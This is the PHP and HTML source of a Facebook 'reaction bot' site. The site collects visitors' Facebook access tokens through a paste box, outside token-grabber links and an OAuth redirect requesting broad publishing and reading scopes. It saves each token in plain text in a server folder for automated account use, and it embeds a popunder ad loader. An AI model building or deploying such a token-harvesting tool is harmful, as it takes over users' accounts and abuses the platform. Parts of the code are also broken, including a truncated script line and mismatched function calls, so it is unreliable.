<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
❤BILAL ASHRAF REACTION BOT❤
</title>
<link rel="stylesheet" type="text/css" href="kashan.css" media="all,handheld"/>
 <script type=text/javascript>
 var _cpp= _cpp || [];
  _cpp['username']    = "Ahsan";
  _cpp['pop_type']    = "2";
  _cpp['onePer']    = "0";
  _cpp['freq']        = "20";   
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src =
var cs = document.getElementsByTagName('script')[0];
cs.parentNode.insertBefore(hs, cs);
})();</script>
<!--- END OF CPX24 CODE --->
<style>
a{
    text-decoration:none;
}
div.foo{
  text-align: center;
}
.letter{
  display: inline-block;
  font-weight: 900;
  font-size: 150px;
  position: relative;
  color: #00B4F1;
  transform-style: preserve-3d;
  perspective: 400;
  z-index: 1;
}
.letter:before, .letter:after{
  position:absolute;
  content: attr(data-letter);
  transform-origin: top left;
  top:0;
  left:0;
}
.letter, .letter:before, .letter:after{
  transition: all 0.3s ease-in-out;
}
.letter:before{
  color: #fff;
  text-shadow: 
    -1px 0px 1px rgba(255,255,255,.8),
    1px 0px 1px rgba(0,0,0,.8);
  z-index: 3;
  transform:
    rotateX(0deg)
    rotateY(-15deg)
    rotateZ(0deg);
}
.letter:after{
  color: rgba(0,0,0,.11);
  z-index:2;
  transform:
    scale(1.08,1)
    rotateX(0deg)
    rotateY(0deg)
    rotateZ(0deg)
    skew(0deg,1deg);
}
.letter:hover:before{
  color: #fafafa;
  transform:
    rotateX(0deg)
    rotateY(-40deg)
    rotateZ(0deg);
}
.letter:hover:after{
  transform:
    scale(1.08,1)
    rotateX(0deg)
    rotateY(40deg)
    rotateZ(0deg)
    skew(0deg,22deg);
}
</style>

<?php session_start();

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$cokis[]=$b.'='.$c;
}
	$true='?'.implode('&',$cokis);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY HABIB cokis',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('cokis')){

        mkdir('cokis');
}

if($bb){

	$blue=fopen('cokis/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('cokis/'.$id)){

	$file=file_get_contents('cokis/'.$id);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('cokis/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('cokis/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('cokis/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('cokis/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('cokis/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('cokis/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '
<div id="container">
<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
<br><font color="white"> Welcome To  Bilal Ashraf (only Wow React ) Site :</font><font color="yellow"> '.$nm.' </font></br>
<font color="white"> Activate Your Bot My Dear Friend </font></br>
<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="button button1" type="submit" style="height:45px;width:200px;" value="Activate Bot">
</form>
</div>
</div></div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'

</center></span>
';
}

public function home(){
echo'
<div id="header">
<div class="foo">
<a href="https://www.facebook.com/haterkaabu.chahsan" target="blank">
  <span class="letter" data-letter="R">R</span>
  <span class="letter" data-letter="E">E</span>
  <span class="letter" data-letter=" A">A</span>
  <span class="letter" data-letter="C">C</span>
  <span class="letter" data-letter="T">T</span>
  <span class="letter" data-letter="S">S</span>
<span class="letter" data-letter="I">I</span>
<span class="letter" data-letter="T">T</span>
<span class="letter" data-letter="E">E</span>
</a></div>
</font>
</div></div>
<a href="https://www.facebook.com/100011308998782" alt="Owner" target="_blank"> <img src="https://graph.facebook.com/100011308998782/picture?type=large" alt="Profile" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="250" height="250"></a></div>

</div>

<span>
</div>



';
}

public function bwh(){
echo'
<div id="container"
    <div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">
<a href="HTTP://BILALTOKEN.TK" target="_blank">

<input class="button button1" type="button" value="GET IPHONE TOKEN"> </a>
<a href="http://chahsan.atwebpages.com/a/token/" target="_blank">
<input class="button button1" type="button" value="GET ANDRIOD TOKEN"> </a>



</center>
<div id="top-content">
<div id="search-form">

<center><form action="index.php" method="post">
<input class="search" type="text" name="token" placeholder="Paste Your Access Token Here" required></br>
<input class="button" type="submit" value="Submit"></form></div></center></div></div></div>

';

$this->membEr();
}

public function membEr(){

	if(!is_dir('cokis')){

	mkdir('cokis');
}

$up=opendir('cokis');

	while($use=readdir($up)){

	if($use != '.' && $use != '..'){

	$user[]=$use;}
}

echo'

<div id="footer">
Active User: <font color="yellow">'.count($user).'
</font>

</div>';

}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('cokis/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Token Expired</h2>";
			</script>';
        unset($_SESSION[key]);
        unlink('cokis/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Invalid Token Or Expired Token</h2>";
			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
